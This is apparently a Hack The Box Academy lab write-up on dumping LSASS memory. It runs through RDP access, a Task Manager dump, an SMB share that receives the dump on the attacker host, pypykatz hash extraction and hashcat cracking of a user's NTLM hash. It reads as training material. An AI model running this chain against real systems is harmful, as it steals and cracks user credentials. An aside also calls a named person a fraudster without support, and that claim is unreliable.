### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Attacking LSASS <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.202.149

---

### Question 1:
What is the name of the executable file associated with the Local Security Authority Process?

🚩 found **lsass.exe**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

Lets RDP into the winbox with the supplied credentials:
```diff
+ $ xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!
```

We're presented with a server manager window, which I'll keep minimized for now. Hit cntl+alt+esc to bring up task manager, that's a program that dave plummer wrote *before* he defrauded hundreds of people with fake software marketed as something it's definitely not.

Anywho, find the Local Security Authority Process, right click it and chose 'create dump file'. After it completes it will prompt you with the output location, in my case:

	C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP

Lets mount a share on our attackbox:
```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support susshare /home/htb-ac-830862/Documents
```

And move the file on windows into the share:
```diff
+ C:\Users\htb-student\Desktop>move lsass.DMP \\10.10.15.16\susshare
```

	        1 file(s) moved.

Now that we have the file locally, let's try running pypykatz on it with the lsa flag:
```diff
+ $ pypykatz lsa minidump lsass.DMP
```

	INFO:pypykatz:Parsing file lsass.DMP
	FILE: ======== lsass.DMP =======
	== LogonSession ==
	authentication_id 1074927 (1066ef)
	session_id 2
	username htb-student
	domainname FS01
	logon_server FS01
	logon_time 2025-10-15T04:15:16.458672+00:00
	sid S-1-5-21-2288469977-2371064354-2971934342-1006
	luid 1074927
		== MSV ==
			Username: htb-student
			Domain: FS01
			LM: NA
			NT: 3c0e5d303ec84884ad5c3b7876a06ea6
			SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
			DPAPI: 0000000000000000000000000000000000000000
		== WDIGEST [1066ef]==
			username htb-student
			domainname FS01
			password None
			password (hex)
		== Kerberos ==
			Username: htb-student
			Domain: FS01
		== WDIGEST [1066ef]==
			username htb-student
			domainname FS01
			password None
			password (hex)
	
	== LogonSession ==
	authentication_id 72780 (11c4c)
	session_id 1
	username DWM-1
	domainname Window Manager
	logon_server 
	logon_time 2025-10-15T03:36:56.318027+00:00
	sid S-1-5-90-0-1
	luid 72780
		== WDIGEST [11c4c]==
			username FS01$
			domainname WORKGROUP
			password None
			password (hex)
		== WDIGEST [11c4c]==
			username FS01$
			domainname WORKGROUP
			password None
			password (hex)
	
	== LogonSession ==
	authentication_id 125957 (1ec05)
	session_id 0
	username Vendor
	domainname FS01
	logon_server FS01
	logon_time 2025-10-15T03:36:58.552404+00:00
	sid S-1-5-21-2288469977-2371064354-2971934342-1003
	luid 125957
		== MSV ==
			Username: Vendor
			Domain: FS01
			LM: NA
			NT: 31f87811133bc6aaa75a536e77f64314
			SHA1: 2b1c560c35923a8936263770a047764d0422caba
			DPAPI: 0000000000000000000000000000000000000000
		== WDIGEST [1ec05]==
			username Vendor
			domainname FS01
			password None
			password (hex)
		== Kerberos ==
			Username: Vendor
			Domain: FS01
		== WDIGEST [1ec05]==
			username Vendor
			domainname FS01
			password None
			password (hex)
	
	SNIP (DPAPI keys)

Here we get an NT hash of the 'Vendor' user: `31f87811133bc6aaa75a536e77f64314`

Lets transfer this to our cracking rig and give it to hashcat as a treat because they're such a good boy:
```diff
+ $ sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /mnt/SSD_DATA/SecLists/rockyou.txt
```

	hashcat (v6.2.6) starting
	
	CUDA API (CUDA 13.0)
	====================
	* Device #1: NVIDIA GeForce RTX 4070, 10170/11850 MB, 46MCU
	* Device #2: NVIDIA GeForce GTX 1080 Ti, 11022/11165 MB, 28MCU
	
	OpenCL API (OpenCL 3.0 CUDA 13.0.94) - Platform #1 [NVIDIA Corporation]
	=======================================================================
	* Device #3: NVIDIA GeForce RTX 4070, skipped
	* Device #4: NVIDIA GeForce GTX 1080 Ti, skipped
	
	Minimum password length supported by kernel: 0
	Maximum password length supported by kernel: 256
	
	Hashes: 1 digests; 1 unique digests, 1 unique salts
	Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
	Rules: 1
	
	Optimizers applied:
	* Zero-Byte
	* Early-Skip
	* Not-Salted
	* Not-Iterated
	* Single-Hash
	* Single-Salt
	* Raw-Hash
	
	ATTENTION! Pure (unoptimized) backend kernels selected.
	Pure kernels can crack longer passwords, but drastically reduce performance.
	If you want to switch to optimized kernels, append -O to your commandline.
	See the above message to find out about the exact limits.
	
	Watchdog: Temperature abort trigger set to 90c
	
	Host memory required for this attack: 1299 MB
	
	Dictionary cache built:
	* Filename..: /mnt/SSD_DATA/SecLists/rockyou.txt
	* Passwords.: 14344391
	* Bytes.....: 139921497
	* Keyspace..: 14344384
	* Runtime...: 1 sec
	
	31f87811133bc6aaa75a536e77f64314:Mic@123
	
	Session..........: hashcat
	Status...........: Cracked
	Hash.Mode........: 1000 (NTLM)
	Hash.Target......: 31f87811133bc6aaa75a536e77f64314
	Time.Started.....: Wed Oct 15 00:47:16 2025 (0 secs)
	Time.Estimated...: Wed Oct 15 00:47:16 2025 (0 secs)
	Kernel.Feature...: Pure Kernel
	Guess.Base.......: File (/mnt/SSD_DATA/SecLists/rockyou.txt)
	Guess.Queue......: 1/1 (100.00%)
	Speed.#1.........:   147.7 MH/s (1.74ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
	Speed.#2.........: 28602.9 kH/s (5.01ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
	Speed.#*.........:   176.4 MH/s
	Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
	Progress.........: 4849664/14344384 (33.81%)
	Rejected.........: 0/4849664 (0.00%)
	Restore.Point....: 0/14344384 (0.00%)
	Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
	Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
	Candidate.Engine.: Device Generator
	Candidates.#1....: efende -> p3KeSn
	Candidates.#2....: 123456 -> efer05
	Hardware.Mon.#1..: Temp: 51c Fan:  0% Util:  0% Core:2520MHz Mem:10251MHz Bus:16
	Hardware.Mon.#2..: Temp: 24c Fan:  0% Util: 37% Core:1911MHz Mem:5005MHz Bus:4
	
	Started: Wed Oct 15 00:47:14 2025
	Stopped: Wed Oct 15 00:47:17 2025

🚩 found **Mic--edit--@123**.
